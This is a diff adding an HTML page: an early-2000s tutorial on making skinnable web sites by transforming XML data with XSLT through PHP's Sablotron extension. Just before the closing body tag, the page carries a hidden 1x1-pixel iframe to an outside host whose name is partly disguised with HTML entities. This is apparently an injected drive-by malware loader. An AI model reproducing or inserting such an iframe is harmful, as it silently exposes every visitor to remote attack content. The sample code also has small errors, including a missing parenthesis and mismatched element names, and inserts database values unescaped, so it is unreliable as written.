@@ -1,0 +1,323 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+	<title>Creating Truly Skinnable Web Sites (ver. 1.0.0) </title>
+	
+	<meta http-equiv="Content-Type" content="text/html charset=utf-8" />
+	<meta content="Copyright 2002 SpiderMan" name="Copyright" />
+	<meta content="SpiderMan" name="Author" />
+	<meta content="English" name="Language" />
+	
+	<style type="text/css">
+	<!--
+		body {font: 12px Verdana, Arial, Helvetica, sans-serif}
+
+		p {text-align: left;}
+		p.para {text-indent: 12px}
+
+		div.lastupdate {text-align: right}
+		/* hack so IE will center my stuff since it doesn't recognize margin: auto */
+		div.center {text-align: center}
+	
+		a:link {text-decoration: underline; color: #003F7F}
+		a:visited {text-decoration: underline; color: #003F7F}
+		a:hover {text-decoration: underline; color: #CC0000}
+
+		h2 {font-size: 12px}
+		h1.title {font-weight: normal; text-align: center; font-size: 12px}
+
+		pre.example {background-color: #EBEBEB; border: 1px solid #000000; padding: 3px; text-align: left; width: 570px; margin-left: auto; margin-right: auto}
+	-->
+	</style>
+</head>
+
+<body>
+	<h1 class="title">
+		<strong>Creating Truly Skinnable Web Sites (ver. 1.0.0)</strong>
+		<br />
+		by: <a href="mailto:spiderman@witty.com">SpiderMan</A> of <a href="http://blacksun.box.sk">Black Sun Research Facility </a>
+	</h1>
+	<p class="para">
+		A few months back, while working on bread5 (my new, at that time, 
+		ultra-secret web site), I had a thought: wouldn't it be cool if I could serve up
+		bread5 with any look I wanted, without having to create entire sites with
+		different layouts by hand. I didn't want to just change the color scheme like
+		most &#8220;skinnable&#8221; sites; I wanted to create completely different looks without
+		going through too much trouble. The skin engine that I created for bread5 uses a
+		host of new technologies to accomplish its tasks; these technologies include 
+		php, XML, XSLT, and XHTML. I've never seen anyone create dynamic sites that are 
+		truly skinnable, so this is all new and uncharted territory for me. As a result, 
+		the method I describe in this article may not be the best way to do this, but I 
+		think it works very well. This is an advanced tutorial. The reader should be
+		familar with PHP and XML.
+	</p>
+	<p class="para">
+		The idea is simple: when one wants to create different versions of one's 
+		site, all the data is the same, the only thing that has changed is the layouts. 
+		So joe-webmaster makes up some layouts then goes at the task of 
+		copying-and-pasting his site's data into these layouts. He does this over and 
+		over for every page on his site. There must be a better way&#8212;there is. Since the 
+		site's data (such as product information) is the same for every layout, put all 
+		the data in an XML file and transform the data into the completely different 
+		layouts using XSLT. So, if I wanted to create a new skin for bread5, all I would 
+		have to do is create a few XSL files for the skin, upload it to the server, and 
+		it's done; the user can choose whichever skin he or she wants to view the site 
+		in. Using this method, you can increase the accessibility of your site just by 
+		creating screen reader and WAP compatible skins. In a few minutes your site can 
+		now be easily accessed by a women using her cell phone, or a blind man sitting 
+		at home.
+	</p>
+	<p class="para">
+		To get started, take your data and put it in an XML file. For example, a 
+		site's index page might look like this:
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+
+&lt;mySite page="index" title="Welcome to my site!"&gt;
+  &lt;linkbar&gt;
+    &lt;item type="link"&gt;
+      &lt;uri&gt;./faq.php&lt;/uri&gt;
+      &lt;title&gt;FAQ&lt;/title&gt;
+      &lt;desc&gt;Frequently Asked Questions about this site&lt;/desc&gt;
+    &lt;/item&gt;
+    &lt;item type="form"&gt;
+      &lt;action&gt;./search.php&lt;/action&gt;
+      &lt;method&gt;post&lt;/method&gt;
+      &lt;input type="text" name="search" maxlength="100"/&gt;
+    &lt;/item&gt;
+    &lt;!-- other links --&gt;
+  &lt;/linkbar&gt;	
+  &lt;greeting&gt;
+    &lt;para&gt;
+      Welcome to my site!
+    &lt;/para&gt;
+    &lt;para&gt;
+      Please check out all the sections.
+    &lt;/para&gt;
+  &lt;/greeting&gt;
+  &lt;news&gt;
+    &lt;news-story&gt;
+      &lt;date&gt;November 29, 2001&lt;/date&gt;
+      &lt;story&gt;Some stuff happened.&lt;/story&gt;
+    &lt;/news-story&gt;
+    &lt;news-story&gt;
+      &lt;date&gt;November 30, 2001&lt;/date&gt;
+      &lt;story&gt;Some more stuff happened.&lt;/story&gt;
+    &lt;/news-story&gt;
+  &lt;/news&gt;
+&lt;/mySite&gt;
+</pre>
+	</div>
+	<p>
+		Looks pretty simple, but it can be improved upon to make it even easier for
+		us to maintain. Instead of adding a news story by manually editing the file, I'd
+		like to pull the stories out of my database. That way, I can create a simple 
+		script to put my news in the database and then I can easily add news stories
+		without having to FTP in to the server and edit the file.
+	</p>
+	<p class="para">
+		We'll be using php's XSLT extension, Sablotron, to transform the XML file 
+		(discussed later on), so why not use its power to add dynamic content to the XML 
+		file also? It's easy to do. Just have php hold the XML data, pass it to 
+		Sablotron and have it pass the data to the XSL file. For example, to pull news
+		stories out of a MySQL database and have it added to the XML file, we would do
+		the following:
+	</p>
+	<div class="center">
+		<pre class="example">
+// code to connect to the database and pull the stories omitted for brevity.
+// $db_query holds an SQL query to pull news stories out of the database. 
+$xsltArgs["stories"]="&lt;news-story&gt;";
+
+while($row= mysql_fetch_array($db_query)
+{
+  $date= $row["date"];
+  $story= $row["story"];
+
+  $xsltArgs["stories"].="
+      &lt;date&gt;$date&lt;/date&gt;
+      &lt;story&gt;$story&lt;/story&gt;";
+}
+
+$xsltArgs["stories"].="&lt;/news-story&gt;";
+</pre>
+	</div>
+	<p>
+		$xsltArgs is an array. $xsltArgs["stories"] holds the XML for the news stories. 
+		This variable will be used later when the transformation takes place. If you 
+		want to add more dynamic data to your site, store it as XML in another slot of 
+		the array.
+	</p>
+	<p class="para">
+		Now that we've created the XML file for the index page, we can create an XSL 
+		file that will be used by Sablotron to transform the XML file. Here is an XSL 
+		file that will transform the XML file into a simple XHTML web page.
+	</p>
+	<div class="center">
+		<pre class="example">
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+  &lt;xsl:output indent="yes" encoding="utf-8" method="xhtml"/&gt;
+	
+  &lt;xsl:template match="/"&gt;
+    &lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt;
+    &lt;head&gt;
+      &lt;title&gt;My Web Site - &lt;xsl:value-of select="mySite/@title" /&gt;&lt;/title&gt;
+      &lt;meta content="My homepage!" name="Description" /&gt;
+      &lt;meta content="My, stuff, cool page" name="Keywords" /&gt;
+      &lt;meta content="ALL" name="Robots" /&gt;
+      &lt;meta content="Copyright 2001 Joe-Webmaster" name="Copyright" /&gt;
+      &lt;meta content="Joe-Webmaster" name="Author" /&gt;
+      &lt;link href="main.css" rel="stylesheet" type="text/css" /&gt;
+    &lt;/head&gt;
+		
+    &lt;body&gt;
+      &lt;br /&gt;
+      &lt;xsl:call-template name="linkbar" /&gt;
+      &lt;br /&gt;
+      &lt;xsl:call-template name="content" /&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+  &lt;/xsl:template&gt;
+	
+  &lt;xsl:template name="linkbar"&gt;
+    &lt;xsl:for-each select="mySite/sidebar/item"&gt;
+      &lt;xsl:if test='@type="link"'&gt;
+        &lt;a href="{uri}" title="{desc}"&gt;&lt;xsl:value-of select="title" /&gt;&lt;/a&gt;&lt;br /&gt;
+      &lt;/xsl:if&gt;
+      &lt;xsl:if test='@type="form"'&gt;
+        &lt;form method="{method}" action="{action}"&gt;
+          &lt;xsl:for-each select="input"&gt;
+            &lt;input class="search" type="{@type}" name="{@name}" size="10" 
+            value="Search" maxlength="{@maxlength}" /&gt;
+          &lt;/xsl:for-each&gt;
+        &lt;/form&gt;
+      &lt;/xsl:if&gt;
+    &lt;/xsl:for-each&gt;	
+  &lt;/xsl:template&gt;
+	
+  &lt;xsl:template name="content"&gt;
+    &lt;strong&gt;&lt;xsl:value-of select="mySite/@page" /&gt;&lt;/strong&gt;
+    &lt;br /&gt;
+    &lt;xsl:for-each select="mySite/greeting/para"&gt;
+      &lt;p&gt;
+        &lt;xsl:value-of select="."/&gt;
+      &lt;/p&gt;
+    &lt;/xsl:for-each&gt;
+      &lt;hr width="454" align="center" /&gt;
+      &lt;span class="news"&gt;News::&lt;/span&gt;
+      &lt;br /&gt;
+      &lt;div class="news"&gt;
+        &lt;xsl:for-each select="document('arg:/stories')/news-story"&gt;
+          &lt;span class="newstime"&gt;&lt;xsl:value-of select="date" /&gt;&lt;/span&gt;
+          &lt;div class="newsitem"&gt;
+            &lt;xsl:value-of select="story" /&gt;
+          &lt;/div&gt;
+          &lt;br /&gt;
+        &lt;/xsl:for-each&gt;
+      &lt;/div&gt;
+  &lt;/xsl:template&gt;
+	
+&lt;/xsl:stylesheet&gt;
+</pre>
+	</div>
+	<p>
+		You could repeat this and create many different XSL files to output many
+		different pages (such as a WML page for viewing on a WAP enabled device). If you
+		stored more dynamic content in another slot of the $xsltArg array, you can
+		retrieve it in your XSL file by using:
+	</p>
+	<div class="center">
+		<pre class="example">
+document('arg:/&lt;name of slot&gt;')
+</pre>
+	</div>
+	<p>
+		where &lt;name of slot&gt; would be the name of the slot in the array.
+	</p>
+	<p class="para">
+		Now all that is left to do is apply the XSL transformation to the XML file. 
+		To do this, I use php's XSLT extension, Sablotron. I should mention that 
+		Sablotron is not enabled in default php installations. To activate it on a *nix
+		machine, run the following:
+	</p>
+	<div class="center">
+		<pre class="example">
+./configure --enable-xslt --with-xslt-sablot
+</pre>
+	</div>
+	<p>
+		If you're being hosted by someone else, ask them to do it for you. I chose a
+		server side transformation because many browsers lack the ability to do 
+		transformations on the client end. By doing the transformation on the server,
+		you're guaranteed that the transformation will occur.
+	</p>
+	<p class="para">
+		The simplest way to use XSLT in php is to pass the path to both the XML file 
+		and the XSL file to the xslt_run() function like this:
+	</p>
+	<div class="center">
+		<pre class="example">
+// First create an XSLT processor.
+$xh= xslt_create();
+
+// $xsl holds the path to the XSL file. $xml holds the path to the XML file.
+xslt_run($xh, $xsl, $xml, "arg:/_result", NULL, $xsltArgs); 
+
+$result= xslt_fetch_result($xh);
+
+// Finally, free the XSLT processor since we're done using it.
+xslt_free($xh);
+</pre>
+	</div>
+	<p>
+		The $result variable will hold the transformed page which you can then output
+		using echo or do whatever else you may want to do.
+	</p>
+	<p class="para">
+		The transformation process is a bit different on servers running PHP 4.1 and 
+		above. I believe, for completeness, I should explain how it is done. If you're
+		running a lower of version of php, feel free to skip this part. With the advent
+		of PHP 4.1, a new interface to the XSLT engine has been added. Now, to transform 
+		an XML file, one does the following:
+	</p>
+	<div class="center">
+		<pre class="example">
+// First create an XSLT processor.
+$xh = xslt_create();
+
+// Next, pass either two variables, one holding the path to an XSL file and one 
+// holding the path to an XML file. $result holds the transformed data. 
+$result= xslt_process($xh, $xsl, $xml, NULL, $xsltArgs);
+
+// Finally, free the XSLT processor since we're done using it.
+xslt_free($xh);
+</pre>
+	</div>
+	<p class="para">
+		There you have it, a simple way to create truly skinnable web sites. What I've 
+		just described is pretty basic, you can improve on it. For example, you can have 
+		php automatically determine if the user is on a WAP device and have it serve up 
+		a WAP page. Also, you can create many skins and have a page that displays a 
+		screen shot of each skin, letting the user choose which one he or she wants to 
+		view the site with. Then, you can store the user's choice in a cookie, so the 
+		next time the user visits the site, the skin he or she chose is already applied. 
+		I hope you learned a lot from this tutorial and start using this technique. As 
+		always, if you find any errors or have any comments please send them to me 
+		(<a href="mailto:spiderman@witty.com" title="Click to e-mail me.">spiderman@witty.com</a>). Kindly direct questions to the message board. Until next time...
+	</p>
+	<h2>Refrences:</h2>
+	<ul>
+		<li><a href="http://www.php.net/manual/en/ref.xslt.php" target="_blank" title="Link opens in a new browser window.">http://www.php.net/manual/en/ref.xslt.php</a></li>
+		<li><a href="http://www.gingerall.com/charlie/ga/act/gadoc.act?pg=sablot" target="_blank" title="Link opens in a new browser window.">http://www.gingerall.com/charlie/ga/act/gadoc.act?pg=sablot</a></li>
+	</ul>
+	<div class="lastupdate">Last updated: <strong>12/22/01</strong></div>
+</div>
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
